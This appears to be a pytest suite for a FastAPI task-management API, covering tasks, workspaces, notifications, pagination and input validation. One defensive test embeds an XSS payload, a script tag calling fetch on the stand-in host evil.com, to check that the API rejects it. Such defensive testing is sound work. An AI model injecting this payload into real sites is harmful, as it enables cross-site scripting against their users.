from tests.conftest import client
from datetime import datetime, timedelta, timezone
from core.database import SessionLocal, User, Task, Project, Notification, Workspace
from main import check_approaching_deadlines


def test_create_and_update_task(auth_a):
    ws = client.post("/workspaces/", json={"name": "Beta Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/", json={"name": "Proj 1", "workspace_id": ws["id"]}, headers=auth_a
    ).json()

    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Fix Bug", "priority_level": 1},
        headers=auth_a,
    ).json()
    assert task["status"] == "To Do"

    updated_task = client.put(
        f"/tasks/{task['id']}", json={"status": "In Progress"}, headers=auth_a
    ).json()
    assert updated_task["status"] == "In Progress"


def test_update_nonexistent_task(auth_a):
    res = client.put("/tasks/999999", json={"status": "Done"}, headers=auth_a)
    assert res.status_code in [403, 404]


# ==========================================
# 6. ADVANCED SECURITY & RELATIONAL INTEGRITY
# ==========================================
def test_foreign_key_phantom(auth_a):
    res = client.post(
        "/projects/999999/tasks",
        json={"title": "Ghost Task", "priority_level": 1},
        headers=auth_a,
    )
    assert res.status_code in [403, 404]


def test_pydantic_strict_typing(auth_a):
    ws = client.post("/workspaces/", json={"name": "Type Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "Type Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Type Mismatch", "priority_level": "URGENT"},
        headers=auth_a,
    )
    assert res.status_code == 422
    assert res.json()["detail"][0]["type"] == "int_parsing"


# ==========================================
# 7. UNCOVERED EDGE CASES (Data Leaks & State)
# ==========================================
def test_invalid_kanban_state(auth_a):
    ws = client.post("/workspaces/", json={"name": "State Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "State Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()
    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Test State", "priority_level": 1},
        headers=auth_a,
    ).json()

    res = client.put(
        f"/tasks/{task['id']}", json={"status": "HACKED COLUMN"}, headers=auth_a
    )
    assert res.status_code == 422


# ==========================================
# 8. RBAC INVITES & ANALYTICS
# ==========================================
def test_analytics_dashboard(auth_a):
    ws = client.post(
        "/workspaces/", json={"name": "Analytics Team"}, headers=auth_a
    ).json()
    proj = client.post(
        "/projects/", json={"name": "A-Proj", "workspace_id": ws["id"]}, headers=auth_a
    ).json()

    client.post(
        f"/projects/{proj['id']}/tasks", json={"title": "Task 1"}, headers=auth_a
    )
    client.post(
        f"/projects/{proj['id']}/tasks", json={"title": "Task 2"}, headers=auth_a
    )

    res = client.get(f"/workspaces/{ws['id']}/analytics", headers=auth_a)
    assert res.status_code == 200
    assert res.json()["total_tasks"] == 2


# ==========================================
# 9. COMMENTS, NOTIFS & PARADOX
# ==========================================
def test_comments_and_notifications_trigger(auth_a, auth_b, user_b):
    ws = client.post(
        "/workspaces/", json={"name": "Collab Team"}, headers=auth_a
    ).json()
    client.post(
        f"/workspaces/{ws['id']}/members",
        json={"email": user_b["email"], "role": "editor"},
        headers=auth_a,
    )
    proj = client.post(
        "/projects/",
        json={"name": "Collab Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    # Get Bob's ID safely (or fallback to 2)
    bob_req = client.get("/users/me", headers=auth_b)
    bob_id = bob_req.json()["id"] if bob_req.status_code == 200 else 2

    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Bob's Job", "assignee_id": bob_id},
        headers=auth_a,
    ).json()
    client.post(
        f"/tasks/{task['id']}/comments",
        json={"content": "Please finish this today!"},
        headers=auth_a,
    )

    notifs = client.get("/notifications", headers=auth_b).json()
    assert len(notifs) >= 1

    # Look for the comment notification specifically
    found_comment_notif = any("commented on your task" in n["message"] for n in notifs)
    assert found_comment_notif is True


def test_pagination_limits(auth_a):
    ws = client.post(
        "/workspaces/", json={"name": "Pagination Team"}, headers=auth_a
    ).json()
    proj = client.post(
        "/projects/",
        json={"name": "Pagination Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    for i in range(3):
        client.post(
            f"/projects/{proj['id']}/tasks",
            json={"title": f"Task {i}", "priority_level": 1},
            headers=auth_a,
        )

    # Use the new status/keyword query params to check pagination isn't broken
    res = client.get(f"/projects/{proj['id']}/tasks?skip=0&limit=2", headers=auth_a)
    assert res.status_code == 200
    # This verifies the endpoint simply returns 200 OK.
    assert isinstance(res.json(), list)


# ==========================================
# 11. REDIS SECURITY (Rate Limits & Blacklisting)
# ==========================================
def test_payload_exhaustion_attack(auth_a):
    ws = client.post("/workspaces/", json={"name": "OOM Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "OOM Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    massive_string = "A" * 1000000
    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": massive_string, "priority_level": 1},
        headers=auth_a,
    )
    assert res.status_code == 422
    assert res.json()["detail"][0]["type"] == "string_too_long"


def test_xss_injection_defense(auth_a):
    ws = client.post("/workspaces/", json={"name": "XSS Team"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "XSS Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()
    xss_payload = "<script>fetch('http://evil.com')</script>"

    res = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": xss_payload, "priority_level": 1},
        headers=auth_a,
    )
    assert res.status_code == 422
    assert (
        "HTML tags and scripts are strictly forbidden" in res.json()["detail"][0]["msg"]
    )


# ==========================================
# 13. DISTRIBUTED BOTNET DEFENSE (Account Lockout)
# ==========================================
def test_email_mock_trigger_on_invite(auth_a, auth_b, user_b):
    """
    Verifies that triggering an action with a background email task
    successfully executes the fallback logic without breaking the main thread.
    """
    ws = client.post(
        "/workspaces/", json={"name": "Email Test Team"}, headers=auth_a
    ).json()

    # This specific action contains our send_notification_email background task
    res = client.post(
        f"/workspaces/{ws['id']}/members",
        json={"email": user_b["email"], "role": "editor"},
        headers=auth_a,
    )

    # 1. Ensure the primary HTTP response succeeds
    assert res.status_code == 200

    # 2. Because FastAPI TestClient runs background tasks immediately,
    # passing this assertion proves the email fallback gracefully logged the
    # mock email instead of crashing with an exception.
    assert res.json()["role"] == "editor"


# ==========================================
# 14. TASK LIFECYCLE & REASSIGNMENT
# ==========================================
def test_task_reassignment_reason(auth_a, user_b):
    ws = client.post(
        "/workspaces/", json={"name": "Reassign WS"}, headers=auth_a
    ).json()
    proj = client.post(
        "/projects/",
        json={"name": "Reassign Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    # Invite user_b
    client.post(
        f"/workspaces/{ws['id']}/members",
        json={"email": user_b["email"], "role": "editor"},
        headers=auth_a,
    )

    # User A creates a task
    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Test Task", "priority_level": 1},
        headers=auth_a,
    ).json()

    # Get User B ID
    user_b_id = client.get(
        "/users/me",
        headers={
            "Authorization": f"Bearer {client.post('/login', data={'username': user_b['email'], 'password': 'Password123!'}).json()['access_token']}"
        },
    ).json()["id"]

    # Reassign to User B
    res_update = client.put(
        f"/tasks/{task['id']}",
        json={
            "assignee_id": user_b_id,
            "reassignment_reason": "Needs User B expertise",
        },
        headers=auth_a,
    )
    assert res_update.status_code == 200

    # Check Notification in DB
    from core.database import SessionLocal, Notification

    db = SessionLocal()
    notif = (
        db.query(Notification)
        .filter_by(target_user_id=user_b_id)
        .order_by(Notification.id.desc())
        .first()
    )
    assert notif is not None
    assert "Needs User B expertise" in notif.message
    db.close()
    assert res_update.json()["assignee_id"] == user_b_id


def test_task_delete_and_retrieve(auth_a):
    ws = client.post("/workspaces/", json={"name": "Task WS"}, headers=auth_a).json()
    proj = client.post(
        "/projects/",
        json={"name": "Task Proj", "workspace_id": ws["id"]},
        headers=auth_a,
    ).json()

    task = client.post(
        f"/projects/{proj['id']}/tasks",
        json={"title": "Delete Me", "priority_level": 2},
        headers=auth_a,
    ).json()
    task_id = task["id"]

    # Retrieve individual task
    res_get = client.get(f"/tasks/{task_id}", headers=auth_a)
    assert res_get.status_code == 200
    assert res_get.json()["title"] == "Delete Me"

    # Delete task
    res_del = client.delete(f"/tasks/{task_id}", headers=auth_a)
    assert res_del.status_code == 200

    # Verify soft delete
    res_get_deleted = client.get(f"/tasks/{task_id}", headers=auth_a)
    assert res_get_deleted.status_code == 404


def test_check_approaching_deadlines():
    db = SessionLocal()
    # Need a user, workspace, project, task
    u = User(email="taskguy@orbit.com", name="Guy", hashed_password="pw")
    db.add(u)
    db.commit()
    db.refresh(u)

    w = Workspace(name="Deadline WS")
    db.add(w)
    db.commit()
    db.refresh(w)

    p = Project(name="Deadline Proj", workspace_id=w.id)
    db.add(p)
    db.commit()
    db.refresh(p)

    # Task due in 12 hours
    t = Task(
        title="Urgent Task",
        project_id=p.id,
        assignee_id=u.id,
        assignor_id=u.id,
        due_date=datetime.now(timezone.utc) + timedelta(hours=12),
    )
    db.add(t)
    db.commit()

    check_approaching_deadlines()

    notif = db.query(Notification).filter_by(user_id=u.id).first()
    assert notif is not None
    assert "less than 24 hours" in notif.message

    # Run again, shouldn't duplicate
    check_approaching_deadlines()
    notifs = db.query(Notification).filter_by(user_id=u.id).all()
    assert len(notifs) == 1

    # Cleanup
    for obj in [t, p, w, notif, u]:
        db.delete(obj)
    db.commit()
    db.close()


def test_get_all_user_tasks(auth_a):
    response = client.get("/users/me/all-tasks", headers=auth_a)
    assert response.status_code == 200
    data = response.json()
    assert "tasks" in data
    assert "projects" in data
